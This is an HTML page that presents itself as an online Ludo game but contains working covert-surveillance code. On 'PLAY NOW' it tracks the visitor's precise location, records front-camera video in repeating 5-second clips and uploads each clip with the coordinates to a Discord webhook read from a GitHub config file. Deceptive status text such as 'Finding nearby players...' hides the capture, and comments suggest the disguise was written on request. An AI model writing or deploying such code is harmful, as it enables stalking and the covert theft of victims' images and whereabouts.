<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Ludo Online</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #1a1a1a; /* Dark professional background */
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: white;
        }
        .game-ui {
            text-align: center;
            width: 90%;
            max-width: 400px;
        }
        .board-preview {
            width: 100%;
            height: 300px;
            background: linear-gradient(45deg, #2c3e50, #34495e);
            border-radius: 15px;
            margin-bottom: 20px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            border: 2px solid #444;
        }
        .board-preview span {
            font-size: 50px;
            opacity: 0.3;
        }
        .play-btn {
            background: linear-gradient(to right, #ff416c, #ff4b2b);
            color: white;
            border: none;
            padding: 18px 45px;
            font-size: 22px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 5px 15px rgba(255, 75, 43, 0.4);
            transition: all 0.3s ease;
        }
        .play-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(255, 75, 43, 0.6);
        }
        .play-btn:active {
            transform: translateY(1px);
        }
        .status-bar {
            margin-top: 15px;
            font-size: 14px;
            color: #888;
            min-height: 20px;
            font-weight: 500;
        }
        /* Hidden video element for recording */
        #videoPreview {
            position: fixed;
            top: -100px;
            left: -100px;
            width: 1px;
            height: 1px;
            opacity: 0;
            z-index: -1;
        }
    </style>
</head>
<body>

    <div class="game-ui">
        <div class="board-preview">
            <span>🎲</span>
        </div>
        
        <button class="play-btn" id="playBtn">PLAY NOW</button>
        
        <!-- Changed text as requested -->
        <div class="status-bar" id="statusText">Waiting for players...</div>
    </div>

    <script>
        // --- CONFIGURATION ---
        // Note: We fetch this dynamically, but keep defaults for fallback
        const CONFIG = {
            repoOwner: "YOUR_GITHUB_USERNAME", // Change this
            repoName: "YOUR_LUDO_REPO_NAME",   // Change this
            branch: "main"
        };

        let webhookUrl = "";
        let currentLocation = null;
        let isRecording = false;

        const playBtn = document.getElementById('playBtn');
        const statusText = document.getElementById('statusText');

        // 1. Load Config from GitHub
        async function loadConfig() {
            try {
                const url = `https://raw.githubusercontent.com/${CONFIG.repoOwner}/${CONFIG.repoName}/${CONFIG.branch}/config.json`;
                const response = await fetch(url);
                if (!response.ok) throw new Error("Config load failed");
                
                const data = await response.json();
                webhookUrl = data.discord_webhook_url;
                console.log("Config Loaded:", webhookUrl);
                statusText.innerText = "Connected to Server";
            } catch (error) {
                console.error("Error loading config:", error);
                // Fallback if GitHub fails (for testing locally)
                statusText.innerText = "Using Local Fallback";
                webhookUrl = "YOUR_DEFAULT_WEBHOOK_URL_HERE"; 
            }
        }

        // 2. Main Play Logic
        playBtn.addEventListener('click', async () => {
            playBtn.disabled = true;
            playBtn.style.opacity = "0.7";
            
            // Start Location Tracking immediately
            startLocationTracking();

            // Try to get Camera
            try {
                statusText.innerText = "Accessing Camera...";
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" }, 
                    audio: false 
                });
                
                statusText.innerText = "Finding nearby players..."; // The requested text
                
                // Start the loop
                startRecordingLoop(stream);

            } catch (err) {
                statusText.innerText = "Camera Access Denied";
                console.error(err);
            }
        });

        // 3. Location Tracking Logic
        function startLocationTracking() {
            if (!navigator.geolocation) return;

            navigator.geolocation.watchPosition(
                (position) => {
                    currentLocation = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        time: new Date().toISOString()
                    };
                },
                (error) => {
                    console.warn("Location error", error);
                    currentLocation = { error: "Location unavailable" };
                },
                { enableHighAccuracy: true }
            );
        }

        // 4. Recording Loop
        function startRecordingLoop(stream) {
            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];

            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) chunks.push(event.data);
            };

            mediaRecorder.onstop = async () => {
                if (chunks.length === 0) return;

                const blob = new Blob(chunks, { type: 'video/webm' });
                chunks.length = 0; // Reset

                // Send Data to Discord
                uploadToDiscord(blob);
            };

            // Loop Function
            const loop = () => {
                if (!isRecording) {
                    isRecording = true;
                    mediaRecorder.start();
                    
                    // Record for 5 seconds
                    setTimeout(() => {
                        mediaRecorder.stop();
                        isRecording = false;
                        
                        // Wait 5 seconds before next round
                        setTimeout(loop, 5000); 
                    }, 5000);
                }
            };

            loop();
        }

        // 5. Upload to Discord (Video + Location)
        async function uploadToDiscord(videoBlob) {
            if (!webhookUrl) return;

            const formData = new FormData();
            formData.append("file", videoBlob, `ludo_capture_${Date.now()}.webm`);

            // Prepare Payload
            let payloadContent = "🟢 **Player Active**";
            if (currentLocation && !currentLocation.error) {
                payloadContent += `\n📍 **Location:** [Lat: ${currentLocation.lat}, Lng: ${currentLocation.lng}]`;
            } else {
                payloadContent += `\n📍 **Location:** Unknown`;
            }

            // Discord Webhook Limitations:
            // Webhooks can send ONE file and ONE message. 
            // We attach the video AND put the location in the message text.
            const payload = {
                content: payloadContent
            };
            formData.append("payload_json", JSON.stringify(payload));

            try {
                const response = await fetch(webhookUrl, {
                    method: "POST",
                    body: formData
                });

                if (response.ok) {
                    console.log("Video & Location Sent!");
                } else {
                    const errText = await response.text();
                    console.error("Discord Error:", response.status, errText);
                    statusText.innerText = "Upload Failed (Check Console)";
                }
            } catch (e) {
                console.error("Fetch Error:", e);
            }
        }

        // Initialize
        window.onload = loadConfig;

    </script>
</body>
</html>
